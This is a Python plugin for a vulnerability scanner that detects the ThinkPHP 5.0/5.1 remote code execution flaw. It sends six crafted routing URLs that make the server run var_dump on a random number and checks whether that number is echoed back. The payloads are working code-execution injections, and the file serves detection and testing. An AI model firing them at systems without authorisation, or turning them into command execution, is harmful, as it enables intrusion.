#!/usr/bin/env python
# -*- coding:utf-8 -*-
# PoC from https://github.com/coffeehb/Some-PoC-oR-ExP/blob/master/thinkphp/thinkphp_v5_rce.txt

class VulnChecker(VulnCheck):
    def __init__(self, ip_and_port_list):
        self._name = 'thinkphp5_rce'
        self.info = "Check the ThinkPHP 5.0.*/5.1.* RCE"
        self.keyword = ['all', 'thinkphp', 'tp', 'rce', 'web', 'danger']
        self.default_ports_list = WEB_PORTS_LIST
        VulnCheck.__init__(self, ip_and_port_list)

    def _check(self, ip, port):
        random_num = ''.join(str(i) for i in random.sample(range(0,9),4))
        check_str = 'string(4) "%s"'%(random_num)
        pocdata = [ r'/index.php?s=index/\think\Request/input&filter=var_dump&data=%s'%(random_num),
                    r'/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=var_dump&vars[1][]=%s'%(random_num),
                    r'/index.php?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=var_dump&vars[1][]=%s'%(random_num),
                    r'/public/index.php?s=index/\think\Request/input&filter=var_dump&data=%s'%(random_num),
                    r'/public/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=var_dump&vars[1][]=%s'%(random_num),
                    r'/public/index.php?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=var_dump&vars[1][]=%s'%(random_num),
                  ]
        url1 = "http://%s:%d"%(ip, int(port)) if add_web_path == "" else "http://%s:%d/%s"%(ip, int(port), add_web_path)
        url2 = "https://%s:%d"%(ip, int(port)) if add_web_path == "" else "https://%s:%d/%s"%(ip, int(port), add_web_path)
        for poc in pocdata:
            try:
                req = Requester(url1+poc)
                if check_str in req.html:
                    result = "exists ThinkPHP 5.0.*/5.1.* RCE, check url: %s"%(url1+poc)
                    self._output(ip, port, result)
                    return
            except RequesterOpenError:
                try:
                    req = Requester(url2+poc)
                    if check_str in req.html:
                        result = "exists ThinkPHP 5.0.*/5.1.* RCE, check url: %s"%(url2+poc)
                        self._output(ip, port, result)
                        return                   
                except:
                    pass
            except:
                pass

globals()['VulnChecker'] = VulnChecker